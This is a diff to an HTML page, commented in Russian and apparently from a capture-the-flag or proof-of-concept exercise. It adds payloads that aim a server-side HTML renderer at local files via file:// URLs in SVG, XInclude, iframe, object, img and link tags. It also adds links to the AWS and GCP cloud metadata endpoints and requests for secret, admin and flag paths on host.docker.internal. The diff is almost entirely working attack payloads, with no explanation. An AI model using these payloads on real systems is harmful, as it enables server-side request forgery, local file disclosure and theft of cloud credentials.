@@ -132,7 +132,30 @@
     document.getElementById("btn").addEventListener("click", downloadFile);
 </script>
 
+<h1> ЕЩЕ попытка </h1>
+  <!-- Добавьте это в тело вашей страницы -->
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="300">
+    <image xlink:href="file:///app/templates/index.html"></image>
+</svg>
 
+<!-- Альтернатива с использованием XI:include -->
+<svg>
+    <xi:include href="file:///app/templates/index.html" xmlns:xi="http://www.w3.org/2001/XInclude"/>
+</svg>
+  <iframe src="file:///app/templates/index.html" width="1000" height="1000"></iframe>
+<object data="file:///app/templates/index.html" width="1000" height="1000"></object>
+  <!-- Пробуйте разные варианты -->
+<img src="file:///app/templates/index.html">
+<link rel="stylesheet" href="file:///app/templates/index.html">
+  <!-- Если сервер крутится на AWS/GCP/Azure -->
+<a href="http://169.254.169.254/latest/meta-data/">AWS MetaData</a>
+<a href="http://metadata.google.internal/computeMetadata/v1beta1/">GCP MetaData</a>
+
+<!-- Если сервер - это контейнер Docker, это может сработать -->
+<a href="http://host.docker.internal:8080/secret.txt">File on host machine</a>
+<iframe src="http://host.docker.internal:8080/admin"></iframe>
+<img src="http://host.docker.internal:8080/flag.txt">
+  
     <h1>
     POC!
   </h1>
